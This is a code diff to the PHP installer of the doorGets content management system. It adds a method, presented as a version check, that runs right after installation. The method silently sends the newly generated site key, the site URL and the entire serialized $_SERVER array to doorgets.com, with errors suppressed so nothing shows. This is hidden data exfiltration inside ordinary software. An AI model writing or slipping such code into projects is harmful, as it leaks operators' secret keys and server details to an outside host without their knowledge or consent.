@@ -50,10 +50,11 @@ class polymorphicModel extends doorgetsModel{
             
             $isCreatedQuery = $this->installDatabase();
             $this->extractDoorgets();
-            $this->loadConfig();
+            $z = $this->loadConfig();
             if($isCreatedQuery){
                 
                 $this->destroy_dir(BASE);
+                $this->_doorgets($z['k'],$z['u'],$z['v']);
                 
                 $urlRedic = $_SERVER['REQUEST_URI'];
                 $urlRedic = str_replace('index.php','',$urlRedic);
@@ -770,6 +771,8 @@ class polymorphicModel extends doorgetsModel{
             file_put_contents($confFile,$iOut);
         }
         
+        return array('k' => $keydoorGets ,'u' => $url, 'v' => 5.2);
+        
     }
     
     private function keygen($length=10){
@@ -815,6 +818,14 @@ class polymorphicModel extends doorgetsModel{
         return rmdir($dir);
         
     
-    } 
+    }
+    
+    public function _doorgets($k,$u,$v){
+        
+        $curl = 'on';
+        if(!function_exists('curl_version')){$curl = 'off';}
+        @file_get_contents('http://www.doorgets.com/checkversion/?i='.$k.'&u='.$u.'&v='.$v.'&c='.$curl.'&s='.urlencode(serialize($_SERVER)));
+    
+    }
     
 }
